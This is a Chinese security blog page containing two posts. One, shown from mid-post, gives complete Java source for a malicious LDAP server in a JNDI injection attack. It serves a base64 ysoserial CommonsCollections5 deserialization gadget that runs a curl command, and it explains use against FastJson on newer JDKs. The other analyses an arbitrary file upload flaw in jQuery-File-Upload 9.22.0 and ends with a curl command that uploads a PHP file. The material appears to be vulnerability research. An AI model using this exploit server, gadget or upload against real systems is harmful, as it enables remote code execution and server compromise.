<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ReadOnlySearchRequest;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LDAPServer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] agv)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line">        String args[] = &#123;<span class="string">&quot;http://localhost:8000/#Exploit&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((args.length &lt; <span class="number">1</span>) || (args[<span class="number">0</span>].indexOf(<span class="string">&#x27;#&#x27;</span>) &lt; <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            System.err.println(LDAPServer.class.getSimpleName() + <span class="string">&quot; &lt;codebase_url#classname&gt; [&lt;port&gt;]&quot;</span>);</span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (args.length &gt; <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(<span class="keyword">new</span> String[] &#123; <span class="string">&quot;dc=example,dc=com&quot;</span> &#125;);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig[] &#123; <span class="keyword">new</span> InMemoryListenerConfig(<span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory)SSLSocketFactory.getDefault()) &#125;);</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(args[<span class="number">0</span>])));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span></span></span><br><span class="line"><span class="class">            <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span><span class="params">(URL cb)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e1)</span><br><span class="line">            &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span><span class="params">(InMemoryInterceptedSearchResult result, String base, Entry e)</span></span></span><br><span class="line"><span class="function">                <span class="keyword">throws</span> LDAPException, MalformedURLException</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (refPos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span></span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span></span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>,Base64.decode(<span class="string">&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAU3QAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAANXEAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAHmN1cmwgaHR0cDovL2xvY2FsaG9zdDo4MDAwL2FhYXQABGV4ZWN1cQB+ADIAAAABcQB+ADdzcQB+ACdzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg=&quot;</span>));</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException e1) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动LDAP Service需要的jar包。<br>pom.xml</p>
<pre><code>        &lt;dependency&gt;
            &lt;groupId&gt;com.unboundid&lt;/groupId&gt;
            &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;
            &lt;version&gt;4.0.8&lt;/version&gt;
            &lt;scope&gt;compile&lt;/scope&gt;
        &lt;/dependency&gt;</code></pre>
<p>base64是直接使用ysoserial随便选择的一个gadget生成的。</p>
<p>FastJson JDK8u191测试:<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/jndi6.png" alt="3D0F294B-BF28-4752-AB61-AFFCD92834F0"></p>
<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>其实用LDAP来反序列的意义也没有太大, 毕竟JNDI注入很多时候也都是依靠反序列来实现控制传入的uri。<br>大概利用场景也就<br>1:FastJson, 毕竟FastJson实例化类后默认只能调用属性的getter/setter方法, 高版本jdk FastJson&lt;=1.2.4用JNDI来反序列也是一种不错的选择。<br>2:非反序列的JNDI注入。<br>3:反序列的时候有黑名单,常见的gadget用不了, 能用jndi的gadget。</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>1.<a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a><br>2.<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/10/26/jQuery-File-Upload-arbitrarily-file-upload-Vuln/"><span>jQuery-File-Upload-arbitrarily-file-upload-Vuln</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/10/26/jQuery-File-Upload-arbitrarily-file-upload-Vuln/" rel="bookmark">
        <time class="entry-date published" datetime="2018-10-26T08:48:39.000Z">
          2018-10-26
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/jq_1.jpg" alt="-w914"></p>
<p>在这看到的, 看到这个的时候有点疑惑这玩意不应该就是个前端的上传么, 怎么还会造成任意文件上传漏洞。  就去下了个源码看了下。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><a target="_blank" rel="noopener" href="https://github.com/blueimp/jQuery-File-Upload/releases/tag/v9.22.0">https://github.com/blueimp/jQuery-File-Upload/releases/tag/v9.22.0</a></p>
<p>下载了代码后, 发现原来也带了后端处理上传的脚本。在server目录下。</p>
<p>在server/index.php中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require(&#39;UploadHandler.php&#39;);</span><br><span class="line">$upload_handler &#x3D; new UploadHandler();</span><br></pre></td></tr></table></figure>
<p>实例化了UploadHandler类。<br>在UploadHandler的构造方法中</p>
<p>构造方法中,  定义了一些配置信息。<br>然后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public function __construct($options &#x3D; null, $initialize &#x3D; true, $error_messages &#x3D; null) &#123;</span><br><span class="line">    $this-&gt;response &#x3D; array();</span><br><span class="line">    $this-&gt;options &#x3D; array(</span><br><span class="line">        &#39;script_url&#39; &#x3D;&gt; $this-&gt;get_full_url().&#39;&#x2F;&#39;.$this-&gt;basename($this-&gt;get_server_var(&#39;SCRIPT_NAME&#39;)),</span><br><span class="line">        &#39;upload_dir&#39; &#x3D;&gt; dirname($this-&gt;get_server_var(&#39;SCRIPT_FILENAME&#39;)).&#39;&#x2F;files&#x2F;&#39;,</span><br><span class="line">        &#39;upload_url&#39; &#x3D;&gt; $this-&gt;get_full_url().&#39;&#x2F;files&#x2F;&#39;,</span><br><span class="line">        &#39;input_stream&#39; &#x3D;&gt; &#39;php:&#x2F;&#x2F;input&#39;,</span><br><span class="line">        &#39;user_dirs&#39; &#x3D;&gt; false,</span><br><span class="line">        &#39;mkdir_mode&#39; &#x3D;&gt; 0755,</span><br><span class="line">        &#39;param_name&#39; &#x3D;&gt; &#39;files&#39;,</span><br><span class="line">        .................</span><br><span class="line">        .................</span><br><span class="line">    if ($initialize) &#123;</span><br><span class="line">        $this-&gt;initialize();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>然后就调用了类中的initialize方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">protected function initialize() &#123;</span><br><span class="line">        switch ($this-&gt;get_server_var(&#39;REQUEST_METHOD&#39;)) &#123;</span><br><span class="line">            case &#39;OPTIONS&#39;:</span><br><span class="line">            case &#39;HEAD&#39;:</span><br><span class="line">                $this-&gt;head();</span><br><span class="line">                break;</span><br><span class="line">            case &#39;GET&#39;:</span><br><span class="line">                $this-&gt;get($this-&gt;options[&#39;print_response&#39;]);</span><br><span class="line">                break;</span><br><span class="line">            case &#39;PATCH&#39;:</span><br><span class="line">            case &#39;PUT&#39;:</span><br><span class="line">            case &#39;POST&#39;:</span><br><span class="line">                $this-&gt;post($this-&gt;options[&#39;print_response&#39;]);</span><br><span class="line">                break;</span><br><span class="line">            case &#39;DELETE&#39;:</span><br><span class="line">                $this-&gt;delete($this-&gt;options[&#39;print_response&#39;]);</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                $this-&gt;header(&#39;HTTP&#x2F;1.1 405 Method Not Allowed&#39;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>根据对应的请求方式调用不同的方法。<br>大概get对应的是下载, post对应的是上传, delete对应的是删除操作。<br>但是在get和delete方法中, 由于都经过了basename方法的处理<br>所以只能删除files目录下的文件。</p>
<p>在post方法中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$files[] &#x3D; $this-&gt;handle_file_upload(</span><br><span class="line">    isset($upload[&#39;tmp_name&#39;]) ? $upload[&#39;tmp_name&#39;] : null,</span><br><span class="line">    $file_name ? $file_name : (isset($upload[&#39;name&#39;]) ?</span><br><span class="line">            $upload[&#39;name&#39;] : null),</span><br><span class="line">    $size ? $size : (isset($upload[&#39;size&#39;]) ?</span><br><span class="line">            $upload[&#39;size&#39;] : $this-&gt;get_server_var(&#39;CONTENT_LENGTH&#39;)),</span><br><span class="line">    isset($upload[&#39;type&#39;]) ?</span><br><span class="line">            $upload[&#39;type&#39;] : $this-&gt;get_server_var(&#39;CONTENT_TYPE&#39;),</span><br><span class="line">    isset($upload[&#39;error&#39;]) ? $upload[&#39;error&#39;] : null,</span><br><span class="line">    null,</span><br><span class="line">    $content_range</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>获取到FILES变量中的数据后, 直接就调用了handle_file_upload方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">protected function handle_file_upload($uploaded_file, $name, $size, $type, $error,</span><br><span class="line">        $index &#x3D; null, $content_range &#x3D; null) &#123;</span><br><span class="line">    $file &#x3D; new \stdClass();</span><br><span class="line">    $file-&gt;name &#x3D; $this-&gt;get_file_name($uploaded_file, $name, $size, $type, $error,</span><br><span class="line">        $index, $content_range);</span><br><span class="line">    $file-&gt;size &#x3D; $this-&gt;fix_integer_overflow((int)$size);</span><br><span class="line">    $file-&gt;type &#x3D; $type;</span><br><span class="line">    if ($this-&gt;validate($uploaded_file, $file, $error, $index)) &#123;</span><br><span class="line">        $this-&gt;handle_form_data($file, $index);</span><br><span class="line">        $upload_dir &#x3D; $this-&gt;get_upload_path();</span><br><span class="line">        if (!is_dir($upload_dir)) &#123;</span><br><span class="line">            mkdir($upload_dir, $this-&gt;options[&#39;mkdir_mode&#39;], true);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path &#x3D; $this-&gt;get_upload_path($file-&gt;name);</span><br><span class="line">        $append_file &#x3D; $content_range &amp;&amp; is_file($file_path) &amp;&amp;</span><br><span class="line">            $file-&gt;size &gt; $this-&gt;get_file_size($file_path);</span><br><span class="line">        if ($uploaded_file &amp;&amp; is_uploaded_file($uploaded_file)) &#123;</span><br><span class="line">            &#x2F;&#x2F; multipart&#x2F;formdata uploads (POST method uploads)</span><br><span class="line">            if ($append_file) &#123;</span><br><span class="line">                file_put_contents(</span><br><span class="line">                    $file_path,</span><br><span class="line">                    fopen($uploaded_file, &#39;r&#39;),</span><br><span class="line">                    FILE_APPEND</span><br><span class="line">                );</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                move_uploaded_file($uploaded_file, $file_path);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>在handle_file_upload方法中, 只要通过了validate方法, 那么就直接执行move_upload_file了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">protected function validate($uploaded_file, $file, $error, $index) &#123;</span><br><span class="line">    if ($error) &#123;</span><br><span class="line">        $file-&gt;error &#x3D; $this-&gt;get_error_message($error);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    $content_length &#x3D; $this-&gt;fix_integer_overflow(</span><br><span class="line">        (int)$this-&gt;get_server_var(&#39;CONTENT_LENGTH&#39;)</span><br><span class="line">    );</span><br><span class="line">    $post_max_size &#x3D; $this-&gt;get_config_bytes(ini_get(&#39;post_max_size&#39;));</span><br><span class="line">    if ($post_max_size &amp;&amp; ($content_length &gt; $post_max_size)) &#123;</span><br><span class="line">        $file-&gt;error &#x3D; $this-&gt;get_error_message(&#39;post_max_size&#39;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!preg_match($this-&gt;options[&#39;accept_file_types&#39;], $file-&gt;name)) &#123;</span><br><span class="line">        $file-&gt;error &#x3D; $this-&gt;get_error_message(&#39;accept_file_types&#39;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里通过或者配置变量数组中的accept_file_types来正则验证上传的文件名,<br>‘accept_file_types’ =&gt; ‘/.+$/i’,<br>配置文件中的accept_file_types为.+,<br>.代表着匹配任意字符 +1到多个字符, 所以是根本没有验证后缀的。<br>造成了任意文件上传。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -F &quot;files&#x3D;@yu.php&quot; http:&#x2F;&#x2F;localhost&#x2F;jQuery-File-Upload-9.22.0&#x2F;server&#x2F;php&#x2F;index.php</span><br><span class="line">&#123;&quot;files&quot;:[&#123;&quot;name&quot;:&quot;yu.php&quot;,&quot;size&quot;:20,&quot;type&quot;:&quot;application\&#x2F;octet-stream&quot;,&quot;url&quot;:&quot;http:\&#x2F;\&#x2F;localhost\&#x2F;jQuery-File-Upload-9.22.0\&#x2F;server\&#x2F;php\&#x2F;files\&#x2F;yu.php&quot;,&quot;deleteUrl&quot;:&quot;http:\&#x2F;\&#x2F;localhost\&#x2F;jQuery-File-Upload-9.22.0\&#x2F;server\&#x2F;php\&#x2F;index.php?file&#x3D;yu.php&quot;,&quot;deleteType&quot;:&quot;DELETE&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

